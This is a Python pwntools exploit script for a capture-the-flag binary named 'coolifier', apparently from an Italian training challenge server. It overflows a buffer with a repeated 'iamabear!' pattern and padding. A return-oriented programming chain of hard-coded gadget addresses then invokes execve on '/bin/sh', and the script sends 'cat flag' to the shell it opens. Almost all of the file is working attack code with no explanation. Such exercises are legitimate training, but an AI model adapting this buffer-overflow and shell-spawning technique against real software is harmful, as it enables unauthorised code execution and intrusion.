from pwn import *

elf = context.binary = ELF('./coolifier')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if args.REMOTE:
    p = remote('coolifier.challs.olicyber.it', 38068)
elif args.GDB:
    p = gdb.debug([elf.path], ''' 
    b *main+224
    c''')
else:
    p = process([elf.path])



bear_times = 15
bear = 'iamabear!'*bear_times

SYSCALL = 0x00000000004011c6, # syscall
POP_RDI =0x00000000004011a6 # pop rdi; add rdi, 8; ret;

bins = elf.search(b'/bin/sh\x00').__next__()
chain = flat([
    p64(POP_RDI),
    bins-0x8,
    0x00000000004011bd, #pop rax; sub rax, 0x37; ret;
    0x3b+0x37,
    0x00000000004011af, # pop rsi; ret; 
    0x0,
    0x000000000040101a, # ret;
    SYSCALL,
]
)
payload =bear.encode()+b'a' + b'a'*8 + chain

p.sendlineafter(b': ', f'{len(payload)}'.encode())
p.sendafter(b': ', payload)
p.recvline()
p.sendline(b'cat flag')
p.interactive()

